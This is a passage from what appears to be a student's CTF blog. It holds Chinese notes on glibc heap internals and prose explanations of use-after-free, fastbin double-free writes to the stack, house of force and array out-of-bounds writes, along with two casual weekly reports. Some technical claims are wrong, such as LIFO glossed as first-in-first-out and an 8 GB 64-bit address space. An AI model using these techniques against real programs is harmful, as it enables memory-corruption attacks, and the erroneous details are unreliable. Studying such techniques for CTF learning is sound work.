<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240409213854456.png" alt="image-20240409213854456"></p>
<p>chunk相当于一段内存区域的状态，在不同的时候有不同的chunk，如下</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240409215156595.png" alt="image-20240409215156595"></p>
<p>像在C语言中执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<p>完这行代码后对于malloc分配的0x100便是chunk，而此时的chunk状态便是malloc chunk，而再执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(ptr)</span><br></pre></td></tr></table></figure>

<p>将这段内存释放，那这段内存区域也就是chunk便会成为 free chunk的状态。这段内存区域并不会消失</p>
<p>相当于用户在通过堆管理器获得一段内存空间作为堆，在使用完成之后，用free将其释放。</p>
<p>这段内存区域，在malloc之后从原本的物理内存变为malloc chunk，以供使用，在free后并不会直接还原为物理内存，而是继续存放在堆管理器中以便下次使用，为了方便的存放，这段内存区域便会变为free chunk的状态存放在堆管理器中。（也是为了节约时间，内存还为物理内存需要进行系统调用）</p>
<p><em>先来看看malloc chunk的结构</em></p>
<p>分为3个部分，prev siz，size和剩下的存放数据的地段</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240410203227873.png" alt="image-20240410203227873"></p>
<p>在理论上size的最后3个位置应该都是，并且是固定的0，无论这个chunk怎么变，都应该是0，于是这3个位置便被利用起来，用分别存放AMP。</p>
<p><em>在看看free chunk的结构</em></p>
<p>对于free chunk他就是之前那个malloc chunk在通过free函数后将其释放后的堆管理器，其构造与malloc chunk的差别在于在size与数据段中间多了fd和bk这部分。其他的相同（free chunk有很多种，这只是其中一种）</p>
<p>先来看看在chunk中共有的<strong>P</strong>位置所存放的数据及其含义。 </p>
<p>这里的p存放的是用来检测这一个chunk的上一个chunk的含义，所返回的数据。</p>
<p>如果检测到这个chunk的上一个是一个malloc chunk和其他的数据，变回返回一个1，存放在这个位置，</p>
<p>如果检测到这个chunk的上一个是一个free chunk的话变回返回一格0，存放在这位置</p>
<p>而当这个p的值为0，便可以知道当前这个chunk以及上面的chunk都是free chunk，此时这两个chunk变回合并为同一个free chunk，将下面的chunk从管理器中去除，整体变为上一个chunk的数据段，上一个chunk中的size则扩大到上下两个chunk合并后的整个chunk的大小。</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240410212049191.png" alt="image-20240410212049191"></p>
<p>free chunk出了这种结构之外还有两种另外的结构</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240410214307841.png" alt="image-20240410214307841"></p>
<p>chunk在代码段的实现</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240416163709790.png" alt="image-20240416163709790"></p>
<p>理论上来说所有的chunk的出现都需要这几行代码的经过产生相应的区域，但由于程序为了节约时间对于不同的时间与不同状态的chunk其结构并不相同，并不是全部都包含由这些结构。不同的chunk有不同的结构，在上文中有所显示。</p>
<p><em>在chunk中，其存储数据的方式和栈的存储方式相反，堆的存储方式为由高地址向低地址不断存储的图，但在堆的chunk中，其结构最上方prev size为最低的地址然后依次向下增大</em>，输入的数据在数据段中从低到高不断增大的地址存放</p>
<p>在前文中得到的ptr指针所指向的便是控制字段size往下的数据段的开头，方便数据的直接存放。</p>
<p>在一个申请的有堆的程序中，在执行完malloc后的各各段的地址如下</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240416170351224.png" alt="image-20240416170351224"></p>
<p>蓝色字体便是程序中的堆的所在地址和长度，其位置在data段的正上方，紧邻这data段中的的bss区（前提是其堆的大小不算太大）</p>
<p>在程序中如果我们申请了一块长度为0x100的堆，那当程序执行完malloc函数后我们所得到的chunk的大小并不就是0x100，一般是0x111，这多出来的0x11包括8字节的prev size和size这两个控制字段，已经一个在size的末尾的p（在上文中有介绍）。</p>
<p>因此指向堆的指针所指向的并不是chunk的开头，而是chunk中的数据段的开头</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240416211427476.png" alt="image-20240416211427476"></p>
<p><strong>prev size的复用</strong></p>
<p>在chunk中的开头的第一个prev size的控制字节是用来存放这个chunk的上面一个free chunk的大小的，它有且只有这一个作用。在一个程序中如果一开始申请的是0x20的长度的堆，那程序中会分配相应大小的chunk用来使用，然后在使用完这个chunk后将其释放，这个chunk便回成为free chunk存放在堆管理器中，方便以后的使用。</p>
<p>在这之后如果我们在程序中再次申请一个堆，程序会先在已有的chunk中寻找有没有适合的free chunk，然后将这个free chunk变为能使用的chunk用于使用，如果此时我们向程序申请一个大小为0x28的长度的堆，似乎之前我们申请的那个堆长度不够不能再使用了。但实际上，在程序中所有的chunk是放在一起的，也正因此才回有prev size的使用。当程序发现现在我们需要的chunk的大小与之前那个已经有的chunk只差一个字段，刚好是prev size等一个控制字段的大小，然后当我们把之前申请的那个chunk从free chunk转化为malloc chunk后，后发现一个问题，此时下一个chunk的开头prev size没有用了，他的上面不是free chunk 然后他刚好在上一个chunk的数据段的下面，而此时的数据段刚好差这一个长度，因此程序会将他直接转化为上一个chunk的数据段，以满足其的使用。这边是prev size的复用。</p>
<p>简单来说便是，在程序中一开始申请了长度为x的堆，后来把他释放了，之后在申请一个长度为x到x+8的堆，程序会将之前申请的那个chunk再次使用，两次使用的chunk会是同一个chunk</p>
<p><strong>物理链表</strong></p>
<p>在chunk中第一个控制字段prev size用于存放上一个chunk的长度，再结合自身的位置便回，可以知道上一个chunk的初始位置，一个chunk知道上一个chunk的初始地址，构成物理链表</p>
<p><strong>bin中的逻辑链表</strong></p>
<p>管理 arena 中空闲 chunk 的结构，以数组的形式存在，数组元素为相应大小的 chunk 链表的链表头，存在于 arena 的 malloc_state 中</p>
<p>bin的结构是一个数组，有一个又一个的指针构成，每一个指针都指向一个相应大小的free chunk的初始位置，在被指向的free chunk中有一个fd控制字段，这个控制字段也存放的是一个指针，执向的是与这个chunk大小相同的的chunk初始位置。在bin作为最开始的指针指向相应大小的chunk，fd在指向相同大小的chunk，这个便是逻辑链表，如图</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240418143002441.png" alt="image-20240418143002441"></p>
<p>用指针的方式将相同大小的chunk连接起来，存放在bin中方便之后的寻找</p>
<p>在bin中还有一种双向链表，将相同的大小的的chunk互相链接起来，以便使用，其基本结构如下，通过两个bin指针与chunk中fd，bk的不断指向构成，其中在使用中，为依次使用，从靠近bin的顺序被依次调用。</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240411162059021.png" alt="image-20240411162059021"> </p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240418151335033.png" alt="image-20240418151335033"></p>
<p>LIFO指其中的chunk的调用和栈上的调用方式一样，先进先出。</p>
<p>管理的free chunk在64位的程序下位32位的程序的两倍的大小</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240418152210990.png" alt="image-20240418152210990"></p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240418152258402.png" alt="image-20240418152258402"></p>
<p><strong>堆的再分配机制</strong></p>
<p>在程序中的有关与堆的分配机制中，在后期有关于新的堆的寻找的中会先去寻找在之前生成chunk得程度够不够当前的malloc所需的长度，只要在之前的malloc的有过长度长出当前需要的malloc的长度，并且之前的那个chunk已经被free了，那程序便会直接将之前的那个free chunk 在现在的malloc中将其转化为可有的chunk，如果之前的那个chunk的长度超过当前的chunk这需要的长度，程序依然会将这个free chunk转化为新的chunk，但是只会使用需要的长度，对于之前那个chunk里的多余的长度，则会在分配之后自动生成一个新的free chunk。prev size和size等控制字段会在其中自动填充形成一个新的free chunk。</p>
<p>**use after free **</p>
<p>使用一个低权限的指针，指向一块存放重要数据的地方，使得可以利用这个非法的指针，对所指向的重要数据进行修改。</p>
<p>在很多情况下我们会使用<code>char* ptr = malloc(0x100)</code>这个命令用于申请一个堆块，这样ptr便会返回一个指向chunk中数据区的指针，我们便可以通过这个指针向这个chunk的数据区中读入数据，当我们不在需要这个堆时，便可以使用<code>free(ptr)</code>这个命令将我们刚刚申请这个堆块释放掉，但是此时有一个必须要注意的一点是，虽然此时之前的chunk已经被free掉了，但是ptr这个指针并没有被释放，它以然指向的是之前的那个chunk的数据段，虽然由于此时的free chunk，并不能被利用，但在后面如果我们再次申请一个长度小于或等于之前的那个堆的长度时，更具堆的再分配机制，程序会将之前的那个chunk从free的状态转化为能正常使用的状态，那么由于在之前分配的堆的指针并没有被我们清零，那个指针执向着之前的那个chunk 的数据区，在这里将之前那个free chunk转化为能用的chunk，由于ptr指向的位置不变，依然是这个chunk的数据区，故在这里prt这个指针也同时执向了这个新的堆的数据区，并拥有对其读写的功能。在有的题目中我们可能没有操作新的这个指针的能力但我们可以通过操作之前那个没有被清理的指针对当下这个对于这个指针进行修改。</p>
<p><strong>双重释放漏洞</strong></p>
<p>对同一个堆块进行两次释放，导致在再申请时，两个不同的指针指向了同一个堆块。</p>
<p>在一个程序中先申请了3个堆块，A·B·C，大小都为8，我们在使用之后将其free掉，但是在free的过程中时，由于这些堆块的大小为8，故在被free调后会被放入到fast bin中，在这里这些堆的排列方式与栈上数据的排列方式相反，先进先出，后进后出。我们在使用完A,B,C这中3个堆块后，先free（A），此时A这个堆块便会被放入fast bin中，然后在free（B），B这个堆块变会被放入A堆块的下方，然后再我们在free（A），虽然我们在之前已经free过了，但这里程序并不会报错而是继续执行下去，导致在fast bin中出现一下情况</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240512150800024.png" alt="image-20240512150800024"></p>
<p>在fast bin有两个A堆块（这里并不能直接对A堆块连续free两次，中间还是要加上一个其他堆块的），由之前的关于堆的分配，我们这里如果在向程序申请3个堆块并且大小相同的情况下，程序会直接从fast bin中分配出去，这里假设我们再次申请，D,E,F，3个大小都为8的堆块。根据fast bin中后进后出的顺序，程序会从上往下对fast bin在分配，于是问题便出现了，在fast bin中有两个A堆块，但是程序不知道，于是程序便会，将这段A地址进行两次分配。导致D和F分配的堆块都是之前的A的地址，这两个指针也同时指向这个地址，使得我们可以使用其中一个对宁外一个指针的内容进行修改，从而到达我们漏洞的使用。</p>
<p><strong>使用这种方式攻击栈</strong></p>
<p>在之前的第二次对堆块的申请中，如果我们申请两次将fast bin下面的A和B申请掉，导致fast bin中还有一个A堆块，但是由于我们之前已经将A堆块申请为D的堆块，那么此时fast bin中的指针和D这个指针会同时指向原本的A的堆块的地址，而我们通过D指针对A进行修改时，会同时对fast bin指向的地址一起修改。</p>
<p>由于在fast bin中堆块的链接是通过其中的fd控制字段指向下一个堆块的起始地址从而实现链接的。</p>
<p>这里虽然fast bin和D指向的是同一块地址区域，但是由于D指向的是一块能使用的chunk，而fast bin指向的是一块free chunk，这两者的区别就在于free chunk多了一个fd的控制字段，在fast bin中用于指向下一个free chunk的起始地址。</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240512165122150.png" alt="image-20240512165122150"></p>
<p>但是在D中的chunk由于不是free chunk，没有fd字段，程序为了最大的利用率于是变会在将A堆块分配给D是将fd字段一同加入到数据段中，因此我们在通过D指针对A堆块进行修改时，最先输入的字节的内容在fast bin指向的A堆块中会自动被识别为fd的值，作为指向下一个free chunk的指针。这里D指针指向的和fast bin中的A堆块是同一个地址，故我们在使用D指针修改时能同时修给fast bin中的值。</p>
<p>这里由于程序不会对我们输入fd进行检查，于是我们便可以对我们输入到A堆块的最开始的字节的数据做手脚，从而是fast bin中的链接的free chunk的值再多一个，而这多出来的便是我们自行输入修改的。</p>
<p>假设我们需要对栈上的某一块地址进行修改，我们便可以先使用D指针向A堆块输入<strong>要修改的栈的地址的上两个字节的地址</strong>，然后在fast bin中A堆块的便会将fd字段也修改成那个栈上的地址。导致程序误以为在fast bin中多了一个free chunk，然后当我们再向程序申请堆块时，如果申请的长度与A的大小相同，程序变回将fast bin中的A再次分配出去，然后我们再一次申请堆块时，由于fast bin中A堆块已经分配出去，而原本A堆块中fd字段指向的是栈上的地址，于是这一次对堆的申请，程序会将fast bin中最近是栈的地址空间当做可用的free chunk，从而分配出去。以供我们进行修改，但是由于这里程序依然是将栈上的地址作为堆块分配出去，然后fd这个字段指向的地址是堆块的开头地址，因此栈上的地址依然会有两个字节被程序认为是chunk的prev size和size字段，而不能使用，只有两个字节下面的地址才是数据段，才能被我们所修改。因此我们在对A堆块fd修改时，要输入的是要修改的栈上地址的上面两个字节的地址才能在后面malloc到栈上地址，修改时修改到我们需要的数据。</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240512173005244.png" alt="image-20240512173005244"></p>
<p>大致的结构如上图，通过对A中的fd的修改，使得fast bin中能指向栈上地址，然后通过对fast bin中的堆的申请，从而申请到栈上的地址做为堆块用于使用，对这个堆块修改，从而间接修改栈上的内容。</p>
<p><strong>house_of_force</strong></p>
<p>通过堆溢出，将top chunk的大小标记为整个地址空间。然后在通过malloc到我们需要修改的地址空间，再此malloc使程序将我们需要修改的地址空间当做chunk分配给我们，然后修改。</p>
<p><strong>top chunk</strong></p>
<ul>
<li><strong>概念：</strong>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。</li>
<li><strong>作用：</strong>该chunk并<strong>不属于任何****bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。</li>
<li><strong>分配的规则：</strong>如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</li>
</ul>
<p>一般来说当我们在程序中malloc一个堆块后，程序分配给我们的chunk其上方就是top chunk的区域，其中包含的就是空闲状态的chunk，方便下次需要chunk时能快速调用。这两个chunk在程序中分配图如下：</p>
<p>在chunk中数据的填入，与下图中的箭头方向相同，从下往上填入。</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240516164904604.png" alt="image-20240516164904604"></p>
<p>如果在我们得到的这个chunk中有堆溢出漏洞的发生，那么我填入的数据便会一直向上填入，在填入的过程中便会将top chunk的原数据覆盖，由于在top chunk中不会对数据进行检查判断是否被篡改，因此当我们填入的数据将top chunk中的size值覆盖为程序整个地址空间大小（32位是4gb，64位是8gb）时，程序会认为整个地址空间都是top chunk，导致我们在下次malloc时，程序在top chunk中寻找是否满足大小时，由于top chunk的size已经被我们修改为程序的整个地址空间了，于是程序会认为整个地址空间都是能被分配的chunk，于是我们在第二次malloc时无论需要的chunk大小是多少程序都会在分配给我们。</p>
<p>于是我们便可以直接从原本的top chunk的地址malloc一个新的chunk，并使这个新的chunk长度为从top chunk的起始地址到我们需要修改的栈上地址的起始空间的前两个字节的长度（在下一次malloc中需要两个字节作为prev size和size，使得我们需要修改的地方能直接成为我们chunk中的数据段，从而直接修改），使得程序将这一段空间作为chunk分配给我们（主要是为了下一次malloc时能直接将要修改的地址分配给我们使用不用将中间的数据区别覆盖·，这个起到一个垫脚石的作用），然后再malloc一段空间，使得程序将栈上的空间作为chunk提供给我们使用。，我们向这个chunk输入数据，从而修改栈上的数据到达目的。</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240516172821078.png" alt="image-20240516172821078"></p>
<p>如果我们要修改得时date段的数据，那便要malloc的长度将使一个负数(date段的数据在chunk的下方)，由于我们在之前的覆盖中已经将top chunk中的size的大小表为整个地址空间，于是我们在malloc一个负数时，程序会将top chunk的起始地址向下移动这个负数的长度。然后我们再malloc一个正数时，程序便会从我们刚刚移动过的top chunk的头地址可是分配一个相应大小的chunk以供使用。</p>
<p>因此我们只在栈溢出后malloc一个负数，其大小就是从top chunk的起始地址到要修改的date段地址的下两个字节的距离的负数（两个字节作为下个chunk的前两个控制字段），然后再malloc一个正数的chunk，输入数据便可以达到我们的目的。</p>
<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240516175155536.png" alt="image-20240516175155536"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/pwn/">pwn</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-周报（2024-4-1-2024-4-7）" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/04/07/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-1-2024-4-7%EF%BC%89/" class="article-date">
  	<time datetime="2024-04-07T13:33:42.000Z" itemprop="datePublished">2024-04-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/04/07/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-1-2024-4-7%EF%BC%89/">
        周报（2024.4.1-2024.4.7）
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这个周过的真快，感觉都还什么都没有干就已经周天了，又要写周报了。</p>
<p>这周从周4到周7一直是清明假，去了一趟北戴河，好玩，爱玩。周天用来写入团申请和作业了，这一下就是4天差不多什么都没有干。</p>
<p>之前3天还说将那个长城杯的复现一下，复现个屁，学长发的脚本连看都看不懂，太痛了。</p>
<p>周三的时候打了那个比赛也是坐牢的一天，连pwn题都直接没有，都不知道做什么。</p>
<p>这周要说干了什么，好像真的说不出来干了啥，打了xyctf可是那个题太简单的，结果这后来的又不回了。索性堆的内容算是开了一个头，数组越界的那题好像还没写，准备写一写。</p>
<p>行吧，这周的周报就这样，感觉这周什么都没有做，就是去北戴河玩了一圈。之后的一周继续开堆的内容和复现栈的题目。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%A8%E6%8A%A5/" rel="tag">周报</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/%E5%91%A8%E6%8A%A5/">周报</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-周报（2024-3-24-2024-3-31）" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/31/%E5%91%A8%E6%8A%A5%EF%BC%882024-3-24-2024-3-31%EF%BC%89/" class="article-date">
  	<time datetime="2024-03-31T13:15:51.000Z" itemprop="datePublished">2024-03-31</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/31/%E5%91%A8%E6%8A%A5%EF%BC%882024-3-24-2024-3-31%EF%BC%89/">
        周报（2024.3.24-2024.3.31）
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>就从这个周开始吧，以后每个周都找个时间写一下周报，不求多，但求精，总结一下每一个周学到的新东西，与这个周做的事。</p>
<p><strong>做过的事</strong></p>
<p>这个周花了3天将近4天去搭了这个博客，已算是把之前的往事补上了，总体还是可以的，不过搭这个博客的时间还是花的比较长了一点，并且这个博客目前的优化还是做得不够好，后期有时间补一下。</p>
<p><strong>学到的新姿势</strong></p>
<p>这周完整的将前一周比赛中的那个题复现了一遍，具体可以看<em>NKctf2024 第一题</em>这篇博客，学到了用过文件的s级权限，从而获得root级权限的过程，感觉又要长脑子了</p>
<p>之后便是在做攻防世界里遇到的关于数组越界的知识，这个感觉道新不新的，以前或许有过接触，不过太久不用有很大的生疏了，既然遇到这个题，还没有想到这个问题，编写了一遍博客详细记录一下，哦，对了，那篇博客的知识点写完了，wp还差着，找个时间补上。</p>
<p><strong>下周事</strong></p>
<p>这个周天整了一下长城杯的比赛，很明显又是坐牢的一天，总感觉有一道题是栈的，看看下个星期能不能有wp，不然就问问学长，尽量把那道题复现出来。</p>
<p>好像周三要比赛，不过那天满课，不管了，到时候看吧，希望不要太坐牢就行。</p>
<p>下周要开始准备学习堆的知识了，又是新的一轮坐牢。栈的SROP和ret2dl-resolve这两种也不算太明白之后要找时间补补。</p>
<p>下周要放清明假，出去玩希望不出什么大问题吧</p>
<p><strong>总</strong></p>
<p>好吧，差不多就这些了，这周也就整了一个博客，学了数组越界和文件的S权限执行。</p>
<p>就这样吧，下周去好好浪一浪。</p>
<p><img src="/2024/03/31/%E5%91%A8%E6%8A%A5%EF%BC%882024-3-24-2024-3-31%EF%BC%89/image-20240331214431138.png" alt="image-20240331214431138"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%A8%E6%8A%A5/" rel="tag">周报</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/%E5%91%A8%E6%8A%A5/">周报</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-数组越界" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/" class="article-date">
  	<time datetime="2024-03-30T02:53:25.000Z" itemprop="datePublished">2024-03-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/">
        数组越界
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>昨天在攻防世界刷题的时候，无意之间找到一道题，不算难，就是一道很基础的栈溢出的题目，不过这个栈溢出的方式在我之前做的题里边还没怎么遇见，今天把他全部整出来了，故写这篇博客记录一下这方法和这道题的wp</p>
<p>放一下题目的连接<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界 (xctf.org.cn)</a>，是这里面pwn的stack2题目</p>
<p><img src="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/image-20240330110056677.png" alt="image-20240330110056677"></p>
<p><strong>知识点</strong></p>
<p>在这道题中用到的栈溢出的方法便是这篇博客的题目，<em>数组越界</em>，</p>
<p>我们知道在C语言之中有一种叫数组的东西，就像<code>int a[9]=0</code>,这样的（字母[数字]）便叫数组，数组一般在定义的时候变会在栈上规划好一片空间，用于专门放数组内的数，一般来说，我们如果在调用数组的时候要对数组中的数进行我们需要的定义时，会可能使用如下的定义方式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span></span><br><span class="line"><span class="type">int</span> b=<span class="number">0</span></span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>]=<span class="number">0</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,$i)</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,$b)</span><br><span class="line">    a[i]=b</span><br></pre></td></tr></table></figure>

<p>即对于数组的第几位和大小都由自己进行定义，这样的定义虽然很方便，但有一个巨大的问题在于在我们一开始的时候便对数组已经下好了定义，而程序在下定义时便已经将栈上的空间分配好了，而我们定义的数组也是只有固定的大小，就像在上面的代码中我们定义的数组是<code>int a[10]=0</code>，那么便只有a[0]到a[9]的长度是在栈上用于存放这个数组的长度的，其他的栈空间，都有属于他们自己的命令与作用，</p>
<p>但是，如果在程序中使用了如上的自定义数组的方式，由于C语言对我们有很大的信任，这样的定于在编译时是不会报错的，但如果我们在定义第几个数组i的这里超过了本来定义好的数组的长度，程序中没有对这个进行长度检查的方式，于是程序会直接就按你发送的长度在栈上找到相应的地方将你之后输入的内容存放进去。</p>
<p>于此，数组越界的利用方式便出来了，当我们可以对数组的第几个数进行自定义时，程序并不会检查是否超过数组的长度，而是依然在栈上寻找输入的相应的地址将要存放的内容存放进去，但是我们知道在数组定义之初，栈上的空间便是以经分配好的了，出了数组相应的空间，栈上的其他空间都存放有相应的数据与命令，而数组越界让我们有了将栈上其他空间的数据改变的能力。</p>
<p>当数组越界发生时，只要我们知道发生越界的这个数组开头与我们需要改变的栈上的数据的地址的距离，便可以在一开始输入数组个数时将距离输入，程序变回自动将这个距离指向的地址找到，然后我们在输入要存放数据，程序变会将会那个地址里存放的内容改为我们输入的数据，但是栈上存放的很大一部分是我们在后面需要执行的数据，特别像<code>ret</code>等命令执行完成之后，esp寄存器所指向的便是程序要执行的命令所存放的地址如下，程序在执行ret命令之前变回将下一步的命令的地址放在esp寄存器中</p>
<p><img src="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/image-20240330142352990.png" alt="image-20240330142352990"></p>
<p>因此，只要我们在知道程序中数组的开头地址，与在执行完这一段包含数组的命令的最后ret命令时，esp寄存器的值，算出差值，在程序执行的过程中将差值输入其中并将其内容改为需要执行的数值，便完成对程序执行的控制，达成栈溢出的目的。<br>以上便是关于栈溢出中数组越界的基本知识点与利用，如果你看了还是不太明白，你可以选择在网上看看其他大佬写的，以上只是我个人的理解与想法，或许有不对的欢迎指出。</p>
<p>接下来便以一道题来做解。</p>
<p><strong>stack2的wp</strong></p>
<p>来吧，来看看这道关于数组越界的题怎么样，老规矩先checksec一下</p>
<p><img src="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/image-20240407215101037.png" alt="image-20240407215101037"></p>
<p>还好pie没开，放到ida里看看</p>
